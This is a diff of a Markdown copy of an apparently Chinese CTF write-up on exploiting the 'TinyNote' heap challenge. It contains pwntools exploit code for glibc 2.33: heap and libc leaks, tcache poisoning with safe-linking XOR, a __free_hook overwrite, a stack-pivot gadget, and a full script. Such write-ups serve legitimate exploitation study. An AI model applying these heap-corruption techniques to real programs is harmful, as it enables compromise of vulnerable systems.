@@ -276,42 +276,17 @@ https://bbs.kanxue.com/user-home-991890.htm
 ```
 一
 前言
-```
-
-
-
-```
 二
 前置知识
-```
-
-
-
-```
 mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
-```
-
-
-
-```
 三
 TinyNote的脚本解析
-```
-
-
-
-```
 add(0)
 add(1)
 delete(0)
 show(0)
 io.recvuntil(b'Content:')
 heap_base = u64(io.recv(5).ljust(8, b'x00')) << 12
-```
-
-
-
-```
 heap = heap_base + 0x2b0
 xor = heap_base >> 12
 delete(1)
@@ -326,11 +301,6 @@ delete(1)
 show(1)
 io.recvuntil(b'Content:')
 libcbase = u64(io.recv(6).ljust(8, b'x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)
-```
-
-
-
-```
 add(0)
 add(1)
 delete(0)
@@ -339,12 +309,7 @@ heap = heap_base + 0x10
 edit(1, p64(xor ^ heap))
 add(0)
 add(0)
-#edit(0, p64(0))
-```
-
-
-
-```
+    #edit(0, p64(0))
 add(1)
 add(2)
 delete(1)
@@ -357,11 +322,6 @@ for i in range(7):
  add(2)
  edit(0, p64(i))
  delete(2)
-```
-
-
-
-```
 edit(0, p64(0))
 add(2)
 edit(0, p64(7))
@@ -374,13 +334,8 @@ for i in range(6):
  edit(0, p64(6-i))
 
 edit(0, p64(0))
-#edit(1, p64(io_list_all >> 12))
+    #edit(1, p64(io_list_all >> 12))
 add(2)
-```
-
-
-
-```
 def change(addr,context):
  edit(0,p64(1))
  edit(1,p64(addr))
@@ -411,17 +366,7 @@ change(heap_base + 0x860,p64(1)+p64(write))
 edit(1,p64(free_hook))
 edit(0,p64(1))
 add(2)
-```
-
-
-
-```
 mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
-```
-
-
-
-```
 from pwn import *
 io = process("./TinyNote")
 libc = ELF("./libc-2.33.so")
@@ -492,7 +437,7 @@ heap = heap_base + 0x10
 edit(1, p64(xor ^ heap))
 add(0)
 add(0)
-#edit(0, p64(0))
+    #edit(0, p64(0))
 
 add(1)
 add(2)
@@ -519,7 +464,7 @@ for i in range(6):
  edit(0, p64(6-i))
 
 edit(0, p64(0))
-#edit(1, p64(io_list_all >> 12))
+    #edit(1, p64(io_list_all >> 12))
 add(2)
 
 def change(addr,context):
@@ -553,11 +498,6 @@ edit(1,p64(free_hook))
 edit(0,p64(1))
 add(2)
 io.interactive()
-```
-
-
-
-```
 四
 总结
 ```
